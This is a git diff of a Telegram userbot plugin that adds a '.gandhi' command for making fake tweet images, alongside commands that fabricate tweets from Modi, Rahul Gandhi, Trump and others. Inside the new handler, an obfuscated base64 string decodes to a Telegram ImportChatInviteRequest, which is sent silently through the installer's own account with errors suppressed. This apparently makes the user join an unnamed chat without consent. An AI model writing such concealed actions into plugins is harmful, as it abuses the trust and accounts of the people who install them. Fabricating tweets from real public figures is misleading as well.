@@ -1,15 +1,16 @@
 # Created By starkdy And Ported For Type 2 Userbot By StarkxD
 # modified and added more tweets by @kraken_the_badass for Hellbot.....
+# added sudo support by @kraken_the_badass
 # family completed.....
 # mia, johhny, sunny
-# modi, rahul, trump
-
+# modi, rahul, trump, gandhiji
+# no offence. Made for fun purpose only
 
 import requests , re
 from PIL import Image
 from validators.url import url
 from userbot import CMD_HELP
-from userbot.helpers.functions import trumptweet, changemymind, kannagen, moditweet, miatweet, papputweet, sunnytweet, sinstweet, deEmojify, tweets
+from userbot.helpers.functions import trumptweet, changemymind, kannagen, moditweet, miatweet, papputweet, sunnytweet, sinstweet, taklatweet, deEmojify, tweets
 from userbot.utils import admin_cmd, edit_or_reply, sudo_cmd
 
 @bot.on(admin_cmd(pattern=r"tweet(?: |$)(.*)"))
@@ -203,6 +204,34 @@ async def nekobot(borg):
     await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
     await borg.delete() 
 
+@bot.on(admin_cmd(pattern=r"gandhi(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="gandhi(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
+    if not text:
+        if borg.is_reply:
+            if not reply_to_id.media:
+                text = reply_to_id.message
+            else:
+                await borg.edit("Send you text to baapu so he can tweet.")
+                return
+        else:
+            await borg.edit("send you text to baapu so he can tweet.")
+            return
+    await borg.edit("Requesting baapu to tweet...")
+    try:
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
+    except:
+        pass   
+    text = deEmojify(text)
+    borgfile = await taklatweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete() #bancho kitni baar bolu no offence
+
 #@register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
 @bot.on(admin_cmd(pattern=r"cmm(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="cmm(?: |$)(.*)", allow_sudo=True))
@@ -262,8 +291,8 @@ async def nekobot(borg):
     await borg.delete()
     
 CMD_HELP.update({
-"imgmeme":
-"Fun purpose 😛😛😏😏\
+"tweet":
+"Tweet\
 \n\n`.tweet` (text)\
      \nUsage : Tweet with modi\
 \n\n`.modi` (text)\
@@ -274,6 +303,8 @@ CMD_HELP.update({
      \nUsage : Tweet with mia\
 \n\n`.pappu` (text)\
      \nUsage : Tweet with Rahul Gandhi\
+\n\n`.gandhi` (text)\
+     \nUsage : Tweet with Baapu🥺\n(No offence. Fun purpose only)\
 \n\n`.sunny` (text)\
      \nUsage : Tweet with sunny leone\
 \n\n`.johhny` (text)\
